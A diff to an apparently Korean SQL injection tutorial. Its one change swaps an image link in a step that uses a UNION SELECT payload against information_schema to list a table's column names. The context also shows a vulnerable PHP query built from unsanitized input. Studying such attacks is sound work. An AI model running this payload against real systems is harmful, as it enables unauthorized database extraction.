@@ -259,7 +259,7 @@ $query = "select * from board where subject LIKE '%$search%'";
 검색란에 2번에서 얻은 테이블 이름을 이용하여 
 `' UNION SELECT ALL 1,column_name,3,4,5,6 FROM information_schema.columns where table_name='테이블 이름'#` 을 입력하여 컬럼의 이름을 찾습니다.
 
-![테이블 컬럼 이름찾기 사진](https://github.com/Tree1st/HK/blob/master/webH/image/SQL_Injection/board_col_name.png)
+![테이블 컬럼 이름찾기 사진](https://github.com/Tree1st/HK/blob/master/webH/image/SQL_Injection/board_users.png)
 
 
 **4. 해당 컬럼 데이터 얻기**
